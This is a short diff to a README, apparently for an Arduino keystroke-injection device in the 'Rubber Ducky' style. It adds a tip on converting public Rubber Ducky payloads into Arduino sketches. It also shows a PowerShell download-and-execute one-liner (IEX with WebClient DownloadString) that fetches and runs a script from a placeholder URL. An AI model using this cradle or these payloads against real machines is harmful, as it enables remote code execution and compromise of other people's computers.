@@ -37,7 +37,11 @@ You need to download and install (duh) the [Arduino IDE](https://www.arduino.cc/
 
 
 ## Tips
-Find a way to do it in Powershell, and run the script from the web as so:
+
+### More payloads
+Google "Rubber Ducky Payloads" -> Convert them to arduino sketches -> Don't forget to change the keyboard layout -> Verify + Compile
+
+### Find a way to do it in Powershell, and run the script from the web as so:
 
 `IEX ((New-Object System.Net.Webclient).DownloadString(\"YOUR_SCRIPT_HOSTED_ON_SOME_SITE_AS_RAW\")); exit`
 
